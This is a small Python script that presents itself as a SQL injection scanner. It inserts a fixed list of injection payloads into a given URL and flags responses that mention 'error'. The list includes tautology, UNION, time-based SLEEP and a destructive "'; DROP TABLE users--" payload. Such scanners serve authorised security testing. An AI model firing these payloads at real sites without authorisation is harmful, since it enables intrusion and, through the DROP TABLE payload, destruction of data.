import sys
import requests
import argparse


# Function for performing an HTTP request to URL
def make_request(url, method="GET", headers=None):
    try:
        if method == "GET":
            response = requests.get(url, headers=headers)
        elif method == "POST":
            response = requests.post(url, headers=headers)
        else:
            print("Invalid HTTP method.")
            return None
    except requests.exceptions.RequestException as e:
        print("An error occurred while processing your request:", e)
        return None

    return response


# Function for Detecting SQL Injection in a URL
def detect_sql_injection(url, output_file=None, method="GET"):
    # Verify whether an output file has been specified.
    if output_file:
        with open(output_file, "a") as f:
            f.write("URL: {}\n".format(url))
    else:
        print("URL:", url)

    # SQL injection testing
    payloads = [
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('a'='a",
        "'; DROP TABLE users--",
        "UNION SELECT null, null, null--",
        "1' AND SLEEP(5)--"
    ]

    # Send an HTTP request with each payload and validate the responses.
    for payload in payloads:
        modified_url = url.replace("{}", payload)
        response = make_request(modified_url, method)

        if response and "error" in response.text.lower():
            # Potential SQL injection has been detected.
            if output_file:
                with open(output_file, "a") as f:
                    f.write("Possible SQL Injection Detected:\n")
                    f.write("    Payload: {}\n".format(payload))
                    f.write("    Response: {}\n".format(response.text))
            else:
                print("Possible SQL Injection Detected:")
                print("    Payload:", payload)
                print("    Response:", response.text)


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detection Program")
    parser.add_argument("URL", help="URL to be scanned.")
    parser.add_argument("-o", "--output", help="Output")
    parser.add_argument("-X", "--method", choices=["GET", "POST"], default="GET", help="Request (GET or POST)")

    args = parser.parse_args()

    detect_sql_injection(args.URL, args.output, args.method)


if __name__ == "__main__":
    main()
